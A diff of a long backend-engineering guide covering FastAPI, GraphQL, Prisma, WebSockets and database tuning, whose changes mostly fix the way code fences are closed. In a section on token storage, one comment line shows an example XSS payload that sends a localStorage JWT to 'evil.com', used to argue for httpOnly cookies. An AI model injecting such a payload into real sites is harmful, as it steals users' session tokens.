@@ -37,7 +37,7 @@ celery_app.conf.beat_schedule = {
     },
 }
 
-```text
+```
 
 ---
 
@@ -65,7 +65,7 @@ async def upload_file(file: UploadFile = File(...)):
 
     return {"url": f"https://s3.amazonaws.com/myapp-uploads/{file.filename}"}
 
-```text
+```
 
 ---
 
@@ -96,7 +96,7 @@ async def export_properties():
         headers={"Content-Disposition": "attachment; filename=properties.csv"}
     )
 
-```text
+```
 
 ---
 
@@ -118,7 +118,7 @@ def send_email(to_email, subject, html_content):
     response = sg.send(message)
     return response.status_code == 202
 
-```text
+```
 
 ---
 
@@ -147,7 +147,7 @@ def send_otp(phone_number):
     redis_client.setex(f"otp:{phone_number}", 300, str(otp))
     send_sms(phone_number, f"Your code is: {otp}. Valid for 5 minutes.")
 
-```text
+```
 
 ---
 
@@ -177,7 +177,7 @@ async def get_properties(tenant: str = Depends(get_tenant_from_request)):
     db.execute(f"SET search_path TO {schema}")
     return db.query(Property).all()
 
-```text
+```
 
 ---
 
@@ -209,7 +209,7 @@ async def login(form_data: OAuth2PasswordRequestForm = Depends()):
     access_token = create_access_token(data={"sub": str(user.id)})
     return {"access_token": access_token, "token_type": "bearer"}
 
-```text
+```
 
 ---
 
@@ -253,7 +253,7 @@ async def get_properties_cursor(cursor: str = None, limit: int = 20):
 
     return {"data": properties, "meta": {"next_cursor": next_cursor, "has_next": has_next}}
 
-```text
+```
 
 ---
 
@@ -278,7 +278,7 @@ async def delete_property(id: int):
 
 properties = db.query(Property).filter(Property.deleted_at.is_(None)).all()
 
-```text
+```
 
 ---
 
@@ -307,7 +307,7 @@ def log_audit(user_id, action, entity_type, entity_id, old_values, new_values, r
     db.add(audit)
     db.commit()
 
-```text
+```
 
 ---
 
@@ -344,7 +344,7 @@ class WebhookService:
         message = json.dumps(payload).encode()
         return hmac.new(self.secret.encode(), message, hashlib.sha256).hexdigest()
 
-```text
+```
 
 ---
 
@@ -383,7 +383,7 @@ async def search(query: str, user_id: int):
         return new_search(query)
     return old_search(query)
 
-```text
+```
 
 ---
 
@@ -404,7 +404,7 @@ async def stream_notifications(user_id: int):
 
     return StreamingResponse(event_generator(), media_type="text/event-stream")
 
-```text
+```
 
 ---
 
@@ -430,7 +430,7 @@ async def get_property(id: int):
 
         return property
 
-```text
+```
 
 ---
 
@@ -503,7 +503,7 @@ async def get_properties(
 
 # http://localhost:8000/redoc - Beautiful ReDoc
 
-```text
+```
 
 ---
 
@@ -556,7 +556,7 @@ async def generate_sales_report():
         filename=filename
     )
 
-```text
+```
 
 ---
 
@@ -595,7 +595,7 @@ async def poll_notifications(
     # Timeout - return empty
     return {"notifications": [], "last_id": last_id}
 
-```text
+```
 
 ---
 
@@ -621,7 +621,7 @@ class Subscription:
 schema = strawberry.Schema(query=Query, mutation=Mutation, subscription=Subscription)
 app.include_router(GraphQLRouter(schema), prefix="/graphql")
 
-```text
+```
 
 ---
 
@@ -664,7 +664,7 @@ async def bulk_delete_properties(ids: List[int]):
     db.commit()
     return {"deleted": len(ids)}
 
-```text
+```
 
 ---
 
@@ -698,7 +698,7 @@ def downgrade():
     op.drop_index('idx_properties_price')
     op.drop_table('properties')
 
-```text
+```
 
 ---
 
@@ -761,7 +761,7 @@ async def refresh_token(refresh_token: str):
     except JWTError:
         raise HTTPException(401, "Invalid token")
 
-```text
+```
 
 ---
 
@@ -786,7 +786,7 @@ async def refresh_token(refresh_token: str):
 from fastapi.middleware.gzip import GZipMiddleware
 app.add_middleware(GZipMiddleware, minimum_size=1000)
 
-```text
+```
 
 ---
 
@@ -828,7 +828,7 @@ class CircuitBreaker:
 
 recommendations = await circuit.call(get_recommendations, user_id) or []
 
-```text
+```
 
 ---
 
@@ -860,7 +860,7 @@ async def create_payment(request: Request, payment: PaymentCreate):
 
 # headers = {'Idempotency-Key': str(uuid.uuid4())}
 
-```text
+```
 
 ---
 
@@ -880,7 +880,7 @@ for user in users:
 
 users = db.query(User).options(joinedload(User.properties)).all()
 
-```text
+```
 
 #### Detection (add to every project)
 
@@ -891,7 +891,7 @@ users = db.query(User).options(joinedload(User.properties)).all()
 from nplusone.ext.sqlalchemy import NPlusOne
 app.config['NPLUSONE_RAISE'] = True  # Crash on N+1 in dev
 
-```text
+```
 
 ---
 
@@ -913,7 +913,7 @@ ALLOWED_ORIGINS = ["https://myapp.com", "https://app.myapp.com"]
 if os.getenv("ENV") == "dev":
     ALLOWED_ORIGINS.append("http://localhost:3000")
 
-```text
+```
 
 ---
 
@@ -938,7 +938,7 @@ async def login(): ...
 @limiter.limit("100/hour")  # Scraping protection
 async def search(): ...
 
-```text
+```
 
 ---
 
@@ -964,7 +964,7 @@ response.set_cookie(
     samesite="lax"   # ? CSRF protection
 )
 
-```text
+```
 
 ---
 
@@ -988,7 +988,7 @@ mime = magic.from_buffer(await file.read(1024), mime=True)
 if mime not in ["image/jpeg", "image/png"]:
     raise HTTPException(400, "Invalid file type")
 
-```text
+```
 
 ---
 
@@ -1015,7 +1015,7 @@ result = db.execute(stmt, {"username": username})
 
 user = db.query(User).filter(User.username == username).first()
 
-```text
+```
 
 ---
 
@@ -1032,7 +1032,7 @@ async def retry_with_backoff(func, max_retries=3):
             delay = min(2 **attempt + random.random(), 60)  # 1s, 2s, 4s...
             await asyncio.sleep(delay)
 
-```text
+```
 
 ---
 
@@ -1056,7 +1056,7 @@ def send_webhook(url, payload):
     # Failed - store in dead letter queue
     store_failed_webhook(url, payload)
 
-```text
+```
 
 ---
 
@@ -1081,7 +1081,7 @@ def is_feature_enabled(flag_name, user_id):
 if is_feature_enabled('new_search', user_id):
     return new_search(query)
 
-```text
+```
 
 ---
 
@@ -1103,7 +1103,7 @@ async def stream_notifications(user_id: int):
 
 # Client: const es = new EventSource('/stream/notifications?user_id=123')
 
-```text
+```
 
 ---
 
@@ -1124,7 +1124,7 @@ async def delete(id: int):
 def get_active_properties():
     return db.query(Property).filter(Property.deleted_at.is_(None)).all()
 
-```text
+```
 
 ---
 
@@ -1150,7 +1150,7 @@ async def update(id: int, update: PropertyUpdate, request: Request):
                      ip_address=request.client.host)
     db.add(audit)
 
-```text
+```
 
 ---
 
@@ -1176,7 +1176,7 @@ async def get_order(id: int):
 
         return order
 
-```text
+```
 
 ---
 
@@ -1218,8 +1218,6 @@ async def get_users():
 
 # Result: 101 queries instead of 2
 
-```text
-
 ```python
 
 # FIXED - Single query with JOIN
@@ -1236,7 +1234,7 @@ async def get_users():
 
 # Result: 1 query total
 
-```text
+```
 
 ---
 
@@ -1277,7 +1275,7 @@ app.post('/process', async (req, res) => {
     }
 });
 
-```text
+```
 
 ---
 
@@ -1311,7 +1309,7 @@ app.post('/analyze', async (req, res) => {
     worker.on('error', (err) => res.status(500).json({ error: err.message }));
 });
 
-```text
+```
 
 ---
 
@@ -1327,8 +1325,6 @@ localStorage.setItem('token', jwt);
 
 // Attacker injects:
 // <script>fetch('https://evil.com/steal', {body: localStorage.getItem('token')})</script>
-
-```text
 
 ```python
 
@@ -1346,7 +1342,7 @@ async def login(response: Response, credentials: LoginRequest):
         samesite="lax"  # CSRF protection
     )
 
-```text
+```
 
 ---
 
@@ -1375,7 +1371,7 @@ async def login(request: Request):
 async def get_properties(request: Request):
     # ...
 
-```text
+```
 
 ---
 
@@ -1401,7 +1397,7 @@ engine = create_engine(
     pool_pre_ping=True     # Test connection before using
 )
 
-```text
+```
 
 ---
 
@@ -1451,7 +1447,7 @@ app.add_middleware(
 
 # With 1M requests/day: 400GB saved/day = 12TB/month
 
-```text
+```
 
 ---
 
@@ -1494,7 +1490,7 @@ app.add_middleware(
     max_age=3600  # Cache preflight for 1 hour
 )
 
-```text
+```
 
 ---
 
@@ -1567,7 +1563,7 @@ async def homepage(user_id: int):
         recommendations = get_default_recommendations()  # Fallback
     return {"recommendations": recommendations}
 
-```text
+```
 
 ---
 
@@ -1625,7 +1621,7 @@ async def create_payment(payment: PaymentCreate, request: Request):
 
 # POST /payments (Idempotency-Key: abc123) Same result, NO duplicate
 
-```text
+```
 
 ---
 
@@ -1671,7 +1667,7 @@ async def retry_with_backoff(
 
 # Attempt 4: Success or final failure
 
-```text
+```
 
 ---
 
@@ -1723,7 +1719,7 @@ for message in consumer:
     event = message.value
     send_email(event['user_id'], f"Order {event['order_id']} confirmed")
 
-```text
+```
 
 ---
 
@@ -1761,7 +1757,7 @@ celery_app.conf.beat_schedule = {
     }
 }
 
-```text
+```
 
 ---
 
@@ -1816,7 +1812,7 @@ crypto.pbkdf2(workerData, salt, 100000, 64, 'sha512', (err, key) => {
   parentPort.postMessage(key.toString('hex'));
 });
 
-```text
+```
 
 ### IDEMPOTENCY RACE CONDITION
 
@@ -1843,7 +1839,7 @@ ON CONFLICT (idempotency_key) DO NOTHING
 RETURNING id;
 COMMIT;
 
-```text
+```
 
 ### FLOATING POINT ERRORS (HFT FINANCE)
 
@@ -1868,7 +1864,7 @@ qty = 3
 total = price * qty  # 3030 cents
 display = Decimal(total) / 100  # 30.30
 
-```text
+```
 
 #### END OF VOLUME 7.3: TITAN BACKEND PHYSICS
 
@@ -1904,7 +1900,7 @@ display = Decimal(total) / 100  # 30.30
 | Context Switches | High | Zero |
 | Latency Floor | 10-50 | < 1 |
 
-```text
+```
 
 #### Production Warning
 
@@ -1925,7 +1921,7 @@ display = Decimal(total) / 100  # 30.30
 | jemalloc | Redis, Rust, Facebook loads | Low |
 | tcmalloc | Google loads, C++ services  | Optimized |
 
-```text
+```
 
 ### LMAX DISRUPTOR: CONCURRENCY WITHOUT LOCKS
 
@@ -1967,7 +1963,7 @@ import asyncpg
 async def get_users():
     await asyncpg.create_pool(...)  # Non-blocking
 
-```text
+```
 
 ### DOUBLE-ENTRY ACCOUNTING SCALING
 
@@ -1994,13 +1990,13 @@ async def get_users():
 
 #### Titan JVM Flags
 
-```text
+```
 -XX:+UseG1GC
 -XX:MaxGCPauseMillis=200
 -XX:G1HeapRegionSize=16m
 -XX:+HeapDumpOnOutOfMemoryError
 
-```text
+```
 
 ### PYTHON GIL CONTENTION PROFILING
 
@@ -2016,7 +2012,7 @@ py-spy record --gil --pid <PID>
 
 # Visualize GIL contention in flame graph
 
-```text
+```
 
 **Fix:** Use multiprocessing or ProcessPoolExecutor for CPU-bound tasks.
 
@@ -2032,7 +2028,7 @@ py-spy record --gil --pid <PID>
 ```bash
 export UV_THREADPOOL_SIZE=64  # Match CPU cores
 
-```text
+```
 
 #### END OF VOLUME 5.3: TITAN RUNTIME INTERNALS
 
@@ -2087,7 +2083,7 @@ struct Counters {
     struct alignas(64) AlignedB { std::atomic<int64_t> value; } counter_b;
 };
 
-```text
+```
 
 ### NUMA AWARENESS
 
@@ -2104,7 +2100,7 @@ struct Counters {
 numactl --hardware
 numastat -m
 
-```text
+```
 
 **Titan Fix:** Pin threads to cores, allocate memory on corresponding NUMA nodes via libnuma.
 
@@ -2125,7 +2121,7 @@ class TtlCompactionFilter : public CompactionFilter {
   }
 };
 
-```text
+```
 
 ### COCKROACHDB CLOCK SKEW / UNCERTAINTY INTERVAL
 
@@ -2169,7 +2165,7 @@ func TransferHandler(w http.ResponseWriter, r *http.Request) {
     // Proceed with transfer...
 }
 
-```text
+```
 
 ### AERON: SUB-MICROSECOND IPC MESSAGING
 
@@ -2192,7 +2188,7 @@ while (publication.offer(buffer, 0, 8) < 0) {
     Thread.onSpinWait();
 }
 
-```text
+```
 
 #### Production Warning
 
@@ -2226,7 +2222,7 @@ def get_total_uniques(pages: list) -> int:
     r.pfmerge("hll:temp", *[f"hll:visitors:{p}" for p in pages])
     return r.pfcount("hll:temp")
 
-```text
+```
 
 ### POWER OF TWO CHOICES LOAD BALANCING
 
@@ -2257,7 +2253,7 @@ func (lb *LoadBalancer) PickBackend() *Backend {
     return lb.backends[j]
 }
 
-```text
+```
 
 ### PROBABILISTIC EARLY EXPIRATION (CACHE STAMPEDE PREVENTION)
 
@@ -2300,7 +2296,7 @@ def xfetch_get(redis_client, key, recompute_fn, ttl=3600, beta=1.0):
     set_with_metadata(redis_client, key, value, ttl)
     return value
 
-```text
+```
 
 ### RAFT PRE-VOTE PHASE (NETWORK PARTITION HARDENING)
 
@@ -2331,7 +2327,7 @@ func (n *RaftNode) handlePreVote(req PreVoteRequest) bool {
          req.LastLogIndex >= n.log.LastIndex())
 }
 
-```text
+```
 
 #### END OF VOLUME 5.6: TITAN ADVANCED NETWORKING & CONSENSUS
 
@@ -2366,7 +2362,7 @@ ALTER TABLE events ALTER COLUMN metadata SET STORAGE MAIN;
 -- EXTERNAL = no compression, out-of-line (faster random access)
 -- EXTENDED = default (compress then out-of-line)
 
-```text
+```
 
 ### VISIBILITY MAP: THE SECRET TO INDEX-ONLY SCANS
 
@@ -2398,7 +2394,7 @@ CREATE INDEX idx_orders_covering ON orders (user_id)
 INCLUDE (status, total, created_at);
 -- All columns in INCLUDE = never touch heap
 
-```text
+```
 
 ### BUFFER POOL: SHARED_BUFFERS TUNING REALITY
 
@@ -2409,7 +2405,7 @@ INCLUDE (status, total, created_at);
 > Problem: OS double-buffers. Same data in shared_buffers AND page cache.
 > effective_cache_size matters more for planner decisions."
 
-```text
+```
 
 # TITAN: Production PostgreSQL Memory Config
 
@@ -2425,7 +2421,7 @@ huge_pages = try              # Reduce TLB misses
 random_page_cost = 1.1        # SSD: almost same as seq
 effective_io_concurrency = 200 # NVMe can handle it
 
-```text
+```
 
 ### CHECKPOINT TUNING: THE I/O SPIKE KILLER
 
@@ -2453,7 +2449,7 @@ checkpoint_timeout = 15min           -- Longer interval
 max_wal_size = 8GB                   -- Avoid forced checkpoints
 min_wal_size = 2GB
 
-```text
+```
 
 ---
 
@@ -2489,7 +2485,7 @@ sysctl -w net.ipv4.tcp_max_tw_buckets=2000000
 conn.SetReadBuffer(16 * 1024 * 1024)  // 16MB
 conn.SetWriteBuffer(16 * 1024 * 1024)
 
-```text
+```
 
 ### TIME_WAIT ACCUMULATION: THE PORT EXHAUSTION TRAP
 
@@ -2517,8 +2513,6 @@ sysctl -w net.ipv4.ip_local_port_range="1024 65535"
 
 # NEVER: net.ipv4.tcp_tw_recycle=1 (BROKEN with NAT)
 
-```text
-
 ```python
 
 # TITAN: HTTP Connection Pooling
@@ -2540,7 +2534,7 @@ client = httpx.Client(
 
 response = client.get("https://api.example.com/data")
 
-```text
+```
 
 ### CONGESTION CONTROL: BBR VS CUBIC
 
@@ -2565,7 +2559,7 @@ sysctl -w net.ipv4.tcp_congestion_control=bbr
 
 sysctl net.ipv4.tcp_congestion_control
 
-```text
+```
 
 ---
 
@@ -2597,7 +2591,7 @@ public Point processDataEscaping(byte[] data) {
 // Verify escape analysis
 // -XX:+PrintEscapeAnalysis -XX:+PrintEliminateAllocations
 
-```text
+```
 
 ### LOCK ELISION AND BIASED LOCKING
 
@@ -2628,7 +2622,7 @@ private final LongAdder counter = new LongAdder();
 counter.increment();       // No contention between threads
 counter.sum();             // Aggregate only when needed
 
-```text
+```
 
 ### GC ROOT SCANNING: THE STOP-THE-WORLD CULPRIT
 
@@ -2638,7 +2632,7 @@ counter.sum();             // Aggregate only when needed
 > Root scanning: Every thread's stack, every static field.
 > 10,000 threads = 10,000 stacks to scan. BEFORE concurrent GC starts."
 
-```text
+```
 
 # TITAN: Reduce GC root scanning overhead
 
@@ -2658,7 +2652,7 @@ counter.sum();             // Aggregate only when needed
 -XX:G1MixedGCCountTarget=16    # More incremental mixed GC
 -XX:G1HeapWastePercent=10      # Tolerate more garbage
 
-```text
+```
 
 ---
 
@@ -2702,7 +2696,7 @@ class User {
     }
 }
 
-```text
+```
 
 ### INLINE CACHE INVALIDATION (IC MISSES)
 
@@ -2744,7 +2738,7 @@ function processNumbers(arr) {
     return sum;
 }
 
-```text
+```
 
 ### DEOPTIMIZATION TRIGGERS
 
@@ -2780,7 +2774,7 @@ delete obj.a;  // Transitions to slow dictionary mode
 // ? TITAN: Set to undefined instead
 obj.a = undefined;  // Keeps fast hidden class
 
-```text
+```
 
 ---
 
@@ -2828,7 +2822,7 @@ public class Stack<T> {
     }
 }
 
-```text
+```
 
 ### MEMORY ORDERING: THE CONCURRENCY NIGHTMARE
 
@@ -2883,7 +2877,7 @@ static {
 VALUE.setRelease(this, 42);  // Release semantics
 int v = (int) VALUE.getAcquire(this);  // Acquire semantics
 
-```text
+```
 
 #### END OF VOLUME 6.4: TITAN DEEP INTERNALS - LOCK-FREE ALGORITHMS
 
@@ -2916,8 +2910,6 @@ app.get('/hash', (req, res) => {
 
 // ? VIBE: Reading large files synchronously
 const data = fs.readFileSync('10gb-file.json');  // BLOCKS EVERYTHING
-
-```text
 
 ```javascript
 // ? TITAN: Stream JSON parsing for large payloads
@@ -2985,7 +2977,7 @@ process.env.UV_THREADPOOL_SIZE = '16';  // Default is 4
 // - dns.lookup (NOT dns.resolve)
 // - zlib (compression)
 
-```text
+```
 
 ### N+1 QUERY PATTERN (DATABASE KILLER)
 
@@ -3010,8 +3002,6 @@ def get_users():
             "post_count": len(posts)
         })
     return result
-
-```text
 
 ```python
 
@@ -3046,8 +3036,6 @@ users = db.query(User).options(
     selectinload(User.followers)    # N:N, use IN query
 ).all()
 
-```text
-
 ```typescript
 // ? TITAN: Prisma with include (eager loading)
 const users = await prisma.user.findMany({
@@ -3080,7 +3068,7 @@ const postLoader = new DataLoader(async (userIds) => {
 // Use in resolver
 resolve: (user) => postLoader.load(user.id)  // Batched automatically!
 
-```text
+```
 
 ### FASTAPI ASYNC THREAD POOL EXHAUSTION
 
@@ -3107,8 +3095,6 @@ async def get_items():
     # SQLAlchemy sync engine in async route = thread pool
     items = db.query(Item).all()  # Blocks!
     return items
-
-```text
 
 ```python
 
@@ -3162,7 +3148,7 @@ def get_users():  # Note: def, not async def
     response = requests.get("http://api.example.com/users")
     return response.json()
 
-```text
+```
 
 ### CACHE STAMPEDE (THUNDERING HERD)
 
@@ -3185,8 +3171,6 @@ def get_popular_products():
     products = db.query(Product).order_by(Product.views.desc()).limit(100).all()
     redis.setex("popular_products", 300, json.dumps(products))
     return products
-
-```text
 
 ```python
 
@@ -3272,7 +3256,7 @@ def get_with_stale(key, ttl=300, stale_ttl=3600):
     # No cache or expired - must compute
     return refresh_cache_sync(key)
 
-```text
+```
 
 #### END OF VOLUME 6.5: TITAN GEMINI RESEARCH - EVENT LOOP & ASYNC FAILURES
 
@@ -3302,8 +3286,6 @@ const resolvers = {
     }
 };
 // Query 100 users = 1 + 100 = 101 database queries
-
-```text
 
 ```typescript
 // ? TITAN: DataLoader for batched queries
@@ -3361,7 +3343,7 @@ const resolvers = {
 };
 // Now: 100 users = 1 user query + 1 posts query = 2 queries!
 
-```text
+```
 
 ### GRAPHQL COMPLEXITY AND DEPTH LIMITING
 
@@ -3379,8 +3361,6 @@ const server = new ApolloServer({
     resolvers
     // Anyone can send arbitrarily complex queries
 });
-
-```text
 
 ```typescript
 // ? TITAN: Query complexity and depth limiting
@@ -3469,7 +3449,7 @@ const server = new ApolloServer({
     ]
 });
 
-```text
+```
 
 ### GRAPHQL SUBSCRIPTIONS AT SCALE
 
@@ -3487,8 +3467,6 @@ import { PubSub } from 'graphql-subscriptions';
 const pubsub = new PubSub();  // In-memory only!
 
 // One server = all connections. Can't scale.
-
-```text
 
 ```typescript
 // ? TITAN: Redis-backed pub/sub for horizontal scaling
@@ -3604,7 +3582,7 @@ setInterval(() => {
     });
 }, 30000);
 
-```text
+```
 
 #### END OF VOLUME 7: TITAN GEMINI RESEARCH - GRAPHQL PRODUCTION PATTERNS
 
@@ -3622,7 +3600,7 @@ setInterval(() => {
 
 #### The Scar
 
-```text
+```
 Error: Timed out fetching a new connection from the connection pool.
 Error Code: P2024
 
@@ -3634,7 +3612,7 @@ What This Means:
 
 * No connection became available ? Query failed
 
-```text
+```
 
 #### Why This Happens (Real Causes)
 
@@ -3668,7 +3646,7 @@ if (process.env.NODE_ENV !== 'production') {
   globalForPrisma.prisma = prisma;
 }
 
-```text
+```
 
 #### Cause 2: Long-Running Queries Blocking Pool
 
@@ -3711,7 +3689,7 @@ async function generateReport() {
   });
 }
 
-```text
+```
 
 #### Cause 3: Connection Limit Too Low for Scale
 
@@ -3737,7 +3715,7 @@ datasource db {
 // Connection string configuration:
 // postgresql://user:pass@host:5432/db?connection_limit=20&pool_timeout=30
 
-```text
+```
 
 #### Cause 4: Multiple Application Instances Overwhelming DB
 
@@ -3770,13 +3748,13 @@ datasource db {
   url      = "postgresql://user:pass@pgbouncer:6432/mydb?pgbouncer=true"
 }
 
-```text
+```
 
 ---
 
 ### DECISION TREE: P2024 DEBUGGING
 
-```text
+```
 P2024 ERROR (Connection Pool Timeout)
 
 +- Step 1: Check how many Prisma instances exist
@@ -3809,7 +3787,7 @@ P2024 ERROR (Connection Pool Timeout)
     ?pool_timeout=30  // Wait 30s instead of 10s
     // This is a bandaid, not a fix!
 
-```text
+```
 
 ---
 
@@ -3854,7 +3832,7 @@ process.on('SIGTERM', async () => {
   process.exit(0);
 });
 
-```text
+```
 
 ---
 
@@ -3894,7 +3872,7 @@ async function checkPoolHealth() {
   }
 }
 
-```text
+```
 
 #### Pattern 2: Query Optimization for Less Connection Hold Time
 
@@ -3928,7 +3906,7 @@ const users = await prisma.user.findMany({
 
 // Result: 10x faster query, 10x less connection hold time
 
-```text
+```
 
 ---
 
@@ -3948,22 +3926,22 @@ const users = await prisma.user.findMany({
 
 #### The Error
 
-```text
+```
 Error: 413 Payload Too Large
 Error: 414 URI Too Long
 Error: 404 Not Found (URL too long for server)
 
-```text
+```
 
 #### Why This Happens
 
-```text
+```
 tRPC batches multiple queries into ONE HTTP request:
 query1 + query2 + query3 = ONE request with LONG URL
 
 If URL > server limit (usually 4-8KB), server rejects it.
 
-```text
+```
 
 #### Real Fixes
 
@@ -3986,7 +3964,7 @@ export const trpc = createTRPCNext<AppRouter>({
   },
 });
 
-```text
+```
 
 #### Fix 2: Split Large Requests from Batch
 
@@ -4017,7 +3995,7 @@ export const trpc = createTRPCNext<AppRouter>({
   },
 });
 
-```text
+```
 
 #### Fix 3: Disable Batching Completely
 
@@ -4044,7 +4022,7 @@ export const trpc = createTRPCNext<AppRouter>({
   },
 });
 
-```text
+```
 
 ---
 
@@ -4052,10 +4030,10 @@ export const trpc = createTRPCNext<AppRouter>({
 
 #### The Error (Late 2024)
 
-```text
+```
 Error: req.socket.once is not a function
 
-```text
+```
 
 #### This is a known issue with tRPC and Next.js 15
 
@@ -4068,7 +4046,7 @@ Error: req.socket.once is not a function
 // Or use pages router for tRPC routes temporarily
 // pages/api/trpc/[trpc].ts instead of App Router
 
-```text
+```
 
 ---
 
@@ -4086,17 +4064,17 @@ Error: req.socket.once is not a function
   }
 }
 
-```text
+```
 
 #### Checklist
 
-```text
+```
 [ ] "strict": true in tsconfig.json
 [ ] All @trpc/* packages same version
 [ ] TypeScript >= 5.7.2
 [ ] IDE using workspace TypeScript (not global)
 
-```text
+```
 
 #### Monorepo Type Resolution
 
@@ -4113,7 +4091,7 @@ export type AppRouter = typeof appRouter;
   }
 }
 
-```text
+```
 
 ---
 
@@ -4174,7 +4152,7 @@ const t = initTRPC.create({
   },
 });
 
-```text
+```
 
 ---
 
@@ -4184,7 +4162,7 @@ const t = initTRPC.create({
 
 #### The Problem
 
-```text
+```
 WebSocket disconnects and:
 
 * User sees stale data
@@ -4195,7 +4173,7 @@ WebSocket disconnects and:
 
 * No reconnection happens automatically
 
-```text
+```
 
 #### WebSocket does NOT auto-reconnect. You must implement it
 
@@ -4277,7 +4255,7 @@ class ReconnectingWebSocket {
   onStatusChange?: (status: 'connected' | 'reconnecting' | 'failed') => void;
 }
 
-```text
+```
 
 ---
 
@@ -4285,11 +4263,11 @@ class ReconnectingWebSocket {
 
 #### The Problem
 
-```text
+```
 Connection stays open for 5 minutes, then mysteriously closes.
 Cause: Firewall/proxy/load balancer killed "idle" connection.
 
-```text
+```
 
 #### Production Heartbeat Pattern
 
@@ -4378,7 +4356,7 @@ const heartbeatSweep = setInterval(() => {
   });
 }, 30000);
 
-```text
+```
 
 ---
 
@@ -4386,12 +4364,12 @@ const heartbeatSweep = setInterval(() => {
 
 #### The Problem
 
-```text
+```
 Single server: 10,000 WebSocket connections = fine
 Multiple servers: User A on Server 1, User B on Server 2
                   Message from A doesn't reach B!
 
-```text
+```
 
 #### Production Scaling with Redis Pub/Sub
 
@@ -4438,13 +4416,13 @@ wss.on('connection', (ws, req) => {
   });
 });
 
-```text
+```
 
 ---
 
 ### DECISION TREE: WEBSOCKET DEBUGGING
 
-```text
+```
 WEBSOCKET ISSUE
 
 +- Connection drops after idle period?
@@ -4473,7 +4451,7 @@ WEBSOCKET ISSUE
     +- Implement connection limits per server
     +- Consider horizontal scaling
 
-```text
+```
 
 ---
 
@@ -4493,21 +4471,21 @@ WEBSOCKET ISSUE
 
 #### The Problem
 
-```text
+```
 Error: Access-Control-Allow-Origin header missing
 CORS blocked the upload to S3.
 But you have CORS configured on the bucket!
 
-```text
+```
 
 #### Why This Happens
 
-```text
+```
 Browser sends OPTIONS preflight request.
 S3 CORS must allow OPTIONS method.
 Or Content-Type mismatch between presigned URL and actual upload.
 
-```text
+```
 
 #### Real Fixes
 
@@ -4538,7 +4516,7 @@ Or Content-Type mismatch between presigned URL and actual upload.
   }
 ]
 
-```text
+```
 
 #### Fix 2: Match Content-Type Exactly
 
@@ -4578,7 +4556,7 @@ fetch(presignedUrl, {
   headers: { 'Content-Type': contentType }  // Same as presigned!
 });
 
-```text
+```
 
 #### Fix 3: Use Region-Specific Endpoints
 
@@ -4596,7 +4574,7 @@ const s3 = new S3Client({
 });
 // URL: https://bucket.s3.ap-south-1.amazonaws.com/key
 
-```text
+```
 
 ---
 
@@ -4636,7 +4614,7 @@ async function createSecurePresignedUrl(
   return { url, key };
 }
 
-```text
+```
 
 ---
 
@@ -4694,7 +4672,7 @@ if (!bucket.tryConsume()) {
   return res.status(429).json({ error: 'Rate limited' });
 }
 
-```text
+```
 
 #### Sliding Window (Best for Precision)
 
@@ -4729,7 +4707,7 @@ class SlidingWindowRateLimiter {
   }
 }
 
-```text
+```
 
 ---
 
@@ -4791,7 +4769,7 @@ async function rateLimitMiddleware(req, res, next) {
   next();
 }
 
-```text
+```
 
 ---
 
@@ -4831,13 +4809,13 @@ async function tieredRateLimitMiddleware(req, res, next) {
   next();
 }
 
-```text
+```
 
 ---
 
 ### DECISION TREE: RATE LIMITING
 
-```text
+```
 RATE LIMITING DECISION
 
 +- Which algorithm?
@@ -4861,7 +4839,7 @@ RATE LIMITING DECISION
     +- Expensive operations ? 10-20 per minute
     +- Webhooks ? 100-500 per minute
 
-```text
+```
 
 ---
 
@@ -4892,9 +4870,7 @@ query GetAuthors {
   }
 }
 
-```text
-
-```text
+```
 Without optimization:
 1 query: Get all authors (10 authors)
 10 queries: Get books for each author
@@ -4902,7 +4878,7 @@ Without optimization:
 Total: 11 queries for one GraphQL request!
 At scale: 1000 authors = 1001 queries ??
 
-```text
+```
 
 #### Real Fix: DataLoader
 
@@ -4947,7 +4923,7 @@ function createContext() {
   };
 }
 
-```text
+```
 
 ---
 
@@ -4977,7 +4953,7 @@ query DeepQuery {
 
 # Server crashes from recursive data loading
 
-```text
+```
 
 #### Real Fix: Limit Query Depth
 
@@ -4992,7 +4968,7 @@ const server = new ApolloServer({
   ]
 });
 
-```text
+```
 
 ---
 
@@ -5014,7 +4990,7 @@ query ExpensiveQuery {
   }
 }
 
-```text
+```
 
 #### Real Fix: Query Cost Analysis
 
@@ -5043,7 +5019,7 @@ type Query {
   users(first: Int): [User] @complexity(multipliers: ["first"])
 }
 
-```text
+```
 
 ---
 
@@ -5095,7 +5071,7 @@ async function checkRateLimit(
   return true;  // Allowed
 }
 
-```text
+```
 
 ---
 
@@ -5140,13 +5116,13 @@ fetch('/graphql', {
 // - Can whitelist only allowed queries
 // - Prevents arbitrary query attacks
 
-```text
+```
 
 ---
 
 ### DECISION TREE: GRAPHQL DEBUGGING
 
-```text
+```
 GRAPHQL ISSUE
 
 +- Slow queries?
@@ -5178,7 +5154,7 @@ GRAPHQL ISSUE
     +- Ensure batch function returns correct order
     +- Handle errors in batch function
 
-```text
+```
 
 ---
 
@@ -5196,7 +5172,7 @@ GRAPHQL ISSUE
 
 ### NEW 2024 REQUIREMENTS (Google & Yahoo)
 
-```text
+```
 February 2024: Bulk senders (5000+ emails/day to Gmail/Yahoo)
 MUST have:
 
@@ -5212,7 +5188,7 @@ MUST have:
 
 Failure = emails go to spam or rejected!
 
-```text
+```
 
 ---
 
@@ -5244,7 +5220,7 @@ v=spf1 include:_spf.google.com include:sendgrid.net -all
 
 # If you need multiple providers, combine them in one record
 
-```text
+```
 
 #### DKIM (DomainKeys Identified Mail)
 
@@ -5270,7 +5246,7 @@ const transporter = nodemailer.createTransport({
   }
 });
 
-```text
+```
 
 #### DMARC (Domain-based Message Authentication)
 
@@ -5300,7 +5276,7 @@ v=DMARC1; p=reject; rua=mailto:dmarc-reports@yourdomain.com; pct=100
 
 # rua ? Where to send aggregate reports
 
-```text
+```
 
 ---
 
@@ -5333,7 +5309,7 @@ if (emailMetrics.spamRate > 0.2) {
   await alertOpsTeam('Spam rate approaching 0.3% limit!');
 }
 
-```text
+```
 
 ---
 
@@ -5359,7 +5335,7 @@ app.post('/unsubscribe', async (req, res) => {
   res.status(200).send('Unsubscribed');
 });
 
-```text
+```
 
 ---
 
@@ -5369,14 +5345,14 @@ app.post('/unsubscribe', async (req, res) => {
 
 #### The Problem
 
-```text
+```
 1. Popular cached item expires
 2. 1000 concurrent requests hit server
 3. All 1000 requests query database
 4. Database overwhelmed
 5. Cascading failure
 
-```text
+```
 
 #### Real Fix 1: Request Coalescing (Locking)
 
@@ -5420,7 +5396,7 @@ async function getCached<T>(
   }
 }
 
-```text
+```
 
